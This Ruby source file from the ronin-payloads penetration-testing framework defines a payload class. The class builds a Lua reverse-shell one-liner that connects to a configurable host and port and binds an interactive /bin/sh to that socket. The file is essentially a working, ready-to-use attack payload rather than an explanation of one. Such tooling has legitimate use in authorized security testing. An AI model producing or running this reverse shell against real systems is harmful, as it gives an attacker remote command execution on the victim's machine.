# frozen_string_literal: true
#
# ronin-payloads - A Ruby micro-framework for writing and running exploit
# payloads.
#
# Copyright (c) 2007-2026 Hal Brodigan (postmodern.mod3 at gmail.com)
#
# ronin-payloads is free software: you can redistribute it and/or modify
# it under the terms of the GNU Lesser General Public License as published
# by the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.
#
# ronin-payloads is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU Lesser General Public License for more details.
#
# You should have received a copy of the GNU Lesser General Public License
# along with ronin-payloads.  If not, see <https://www.gnu.org/licenses/>.
#

require 'ronin/payloads/command_payload'
require 'ronin/payloads/mixins/reverse_shell'

module Ronin
  module Payloads
    module CMD
      module Lua
        #
        # A basic `lua` reverse shell command.
        #
        class ReverseShell < CommandPayload

          include Mixins::ReverseShell

          register 'cmd/lua/reverse_shell'

          description <<~DESC
            A basic `lua` reverse shell command.
          DESC

          #
          # Builds the `lua` reverse shell command.
          #
          def build
            @payload = %{lua -e "require('socket');require('os');t=socket.tcp();t:connect('#{host}','#{port}');os.execute('/bin/sh -i <&3 >&3 2>&3');"}
          end

        end
      end
    end
  end
end
